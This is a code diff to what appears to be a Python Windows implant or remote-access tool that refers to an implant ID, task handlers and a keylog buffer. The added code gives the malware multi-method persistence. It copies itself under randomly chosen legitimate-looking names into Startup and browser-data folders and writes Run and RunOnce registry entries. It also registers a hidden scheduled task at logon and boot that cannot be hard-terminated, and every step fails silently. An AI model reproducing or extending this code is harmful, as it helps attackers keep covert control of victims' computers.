@@ -106,23 +106,195 @@ def generate_implant_id():
         return wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
     except:
         return str(uuid.uuid4())
-
+        
 def establish_persistence():
-    script_path = os.path.abspath(__file__)
-    persist_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Edge", "edgeupd.py")
-    if script_path.lower() == persist_path.lower():
-        return
+    """Multi-method persistence for compiled exe"""
+    
+    # Get current executable path
+    exe_path = sys.executable if hasattr(sys, 'frozen') else os.path.abspath(__file__)
+    
+    persist_name = random.choice(LEGIT_PERSISTENCE_NAMES)
+    persist_filename = persist_name.replace(' ', '') + '.exe'
+    
+    possible_dirs = [
+        os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup"),
+        os.path.join(os.getenv("APPDATA"), "Microsoft", "Edge", "User Data"),
+        os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data"),
+        os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Templates"),
+        os.path.join(os.getenv("TEMP"), "WindowsUpdate")
+    ]
+    
+    # Filter to valid directories
+    persist_dir = random.choice([d for d in possible_dirs if os.path.exists(os.path.dirname(d))])
+    persist_path = os.path.join(persist_dir, persist_filename)
+    
+    if exe_path.lower() == persist_path.lower():
+        return True
+    
+    success = False
+    
+    # Copy executable method
     try:
         os.makedirs(os.path.dirname(persist_path), exist_ok=True)
-        with open(script_path, "rb") as f:
-            data = f.read()
-        with open(persist_path, "wb") as f:
-            f.write(data)
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "MicrosoftEdgeUpdate", 0, winreg.REG_SZ, f"pythonw \"{persist_path}\"")
-        winreg.CloseKey(key)
-    except:
-        pass  # silent fail
+        
+        # If running as exe, use current executable
+        if hasattr(sys, 'frozen'):
+            current_exe = sys.executable
+            # Copy current executable
+            with open(current_exe, 'rb') as src:
+                data = src.read()
+            with open(persist_path, 'wb') as dst:
+                dst.write(data)
+        else:
+            # If running as script, we'll need to compile first or handle differently
+            # For now, just copy the script
+            with open(exe_path, "rb") as f:
+                data = f.read()
+            with open(persist_path, "wb") as f:
+                f.write(data)
+        
+        # Registry persistence - using exe path
+        try:
+            key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, 
+                r"Software\Microsoft\Windows\CurrentVersion\Run", 
+                0, 
+                winreg.KEY_SET_VALUE
+            )
+            winreg.SetValueEx(key, persist_name, 0, winreg.REG_SZ, persist_path)
+            winreg.CloseKey(key)
+            success = True
+            if DEBUG_MODE:
+                logging.info(f"Persistence established: {persist_path}")
+        except Exception as e:
+            if DEBUG_MODE:
+                logging.error(f"Registry persistence failed: {e}")
+            
+            # Alternative registry location
+            try:
+                key = winreg.OpenKey(
+                    winreg.HKEY_CURRENT_USER, 
+                    r"Software\Microsoft\Windows\CurrentVersion\RunOnce", 
+                    0, 
+                    winreg.KEY_SET_VALUE
+                )
+                winreg.SetValueEx(key, persist_name, 0, winreg.REG_SZ, persist_path)
+                winreg.CloseKey(key)
+                success = True
+            except:
+                pass
+        
+    except Exception as e:
+        if DEBUG_MODE:
+            logging.error(f"File copy failed: {e}")
+    
+    # Startup folder backup method
+    if not success:
+        try:
+            startup_folder = os.path.join(
+                os.getenv("APPDATA"), 
+                "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
+            )
+            startup_path = os.path.join(startup_folder, persist_filename)
+            
+            if not os.path.exists(startup_path):
+                if hasattr(sys, 'frozen'):
+                    current_exe = sys.executable
+                    with open(current_exe, 'rb') as src:
+                        data = src.read()
+                    with open(startup_path, 'wb') as dst:
+                        dst.write(data)
+                else:
+                    with open(exe_path, "rb") as f:
+                        data = f.read()
+                    with open(startup_path, "wb") as f:
+                        f.write(data)
+                success = True
+                if DEBUG_MODE:
+                    logging.info(f"Startup folder persistence: {startup_path}")
+        except Exception as e:
+            if DEBUG_MODE:
+                logging.error(f"Startup folder failed: {e}")
+    
+    # Task Scheduler method (additional persistence)
+    if success:
+        try:
+            create_scheduled_task(persist_name, persist_path)
+        except:
+            pass
+    
+    return success
+
+
+def create_scheduled_task(task_name, exe_path):
+    """Create scheduled task for additional persistence"""
+    try:
+        # Create XML for scheduled task
+        xml_template = f'''<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Description>{task_name}</Description>
+  </RegistrationInfo>
+  <Triggers>
+    <LogonTrigger>
+      <Enabled>true</Enabled>
+    </LogonTrigger>
+    <BootTrigger>
+      <Enabled>true</Enabled>
+    </BootTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>LeastPrivilege</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>false</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>true</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>true</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>"{exe_path}"</Command>
+    </Exec>
+  </Actions>
+</Task>'''
+        
+        # Save XML temporarily
+        temp_xml = os.path.join(os.getenv("TEMP"), f"{task_name}.xml")
+        with open(temp_xml, 'w', encoding='utf-16') as f:
+            f.write(xml_template)
+        
+        # Create task using schtasks
+        subprocess.run(
+            f'schtasks /create /tn "{task_name}" /xml "{temp_xml}" /f',
+            shell=True,
+            capture_output=True
+        )
+        
+        # Clean up
+        os.remove(temp_xml)
+        
+        if DEBUG_MODE:
+            logging.info(f"Scheduled task created: {task_name}")
+    except Exception as e:
+        if DEBUG_MODE:
+            logging.error(f"Scheduled task failed: {e}")
 
 # ===================== TASK HANDLERS =====================
 keylog_buffer = []
@@ -1248,5 +1420,6 @@ def handle_task(task):
 if __name__ == "__main__":
     import sys
     main()
+
 
 
